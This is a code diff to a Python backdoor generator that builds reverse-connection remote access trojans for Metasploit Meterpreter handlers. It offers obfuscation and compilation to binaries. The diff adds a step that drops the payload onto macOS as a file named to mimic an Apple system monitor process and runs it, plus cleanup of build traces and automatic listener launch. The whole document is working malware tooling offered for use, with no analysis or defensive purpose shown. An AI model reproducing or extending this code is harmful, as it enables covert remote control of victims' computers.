@@ -1,5 +1,6 @@
 import os
 import socket
+import shutil
 import requests
 from pickle import GLOBAL
 logo = """
@@ -229,7 +230,7 @@ main()
         print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/reverse_http')  
 def gen_rev_ssl_tcp():
     global name
-    name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
+    name = 'ocr'
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
@@ -265,22 +266,58 @@ exec(zlib.decompress(base64.b64decode(d)),{'s':s})
 def postgen():
     opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
     if opt_obf == 'y':
-        
+        encrypted = True
         import obfuscator
         obfuscator.MainMenu(name)
-        encrypted = True
-        compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
-        if compiling == 'y':
-            if encrypted == True:
-                compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_or.py'
-                os.system(compcomd)
-                print('Saved under "dist" folder')
-            else:
-                compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
-                os.system(compcomd)
-                os.system(clear)
-                print(logo)
-                print('Backdoor saved under "dist" folder')
+    compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
+    if compiling == 'y':
+        if encrypted == True:
+            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name+'_or.py'
+            os.system(compcomd)
+            print('Saved under "dist" folder')
+        else:
+            compcomd = 'pyinstaller -F --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 '+name
+            os.system(compcomd)
+            os.system(clear)
+            print(logo)
+            print('Backdoor saved under "dist" folder')
+    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (y/n): ')
+    if hide == 'y':
+        global name2
+        name2=input('Please enter the name for the rat: ')
+        with open(name2, 'a+') as hider:
+            v= '''
+from ast import AnnAssign
+import os
+import shutil
+from unicodedata import name
+directory_path = os.getcwd()
+folder_name = os.path.basename(directory_path)
+anan= __file__
+filename = anan.split('/')
+a=anan.replace(str(filename[-1]), '')
+src=a+'ocr/ocr_or'
+dest='/Users/Shared/com.apple.system.monitor'
+shutil.copyfile(src, dest)
+os.system('chmod u+x '+dest)
+os.system(dest)
+            '''
+            hider.write(v)
+            hider.close()
+            os.system('pyinstaller --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "dist/ocr_or:ocr" --windowed '+str(name2))
+def cleanup():
+    try:
+        os.remove(os.getcwd()+'/dist/ocr_or')
+        os.remove('ocr')
+        os.remove('ocr_or.py')
+        os.remove('ocr_or.spec')
+        os.remove(name2)
+        os.remove(name2+'.spec')
+        shutil.rmtree(os.getcwd()+'/dist/ocr_or.app')
+        shutil.rmtree(os.getcwd()+'/dist/'+name2)
+    except PermissionError:
+        pass
+
 print("""
     
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
@@ -302,12 +339,14 @@ if nscan == "2":
 if nscan == "3":
     gen_rev_http()
     postgen()
+    cleanup()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
 if nscan == "4":
     gen_rev_ssl_tcp()
     postgen()
+    cleanup()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
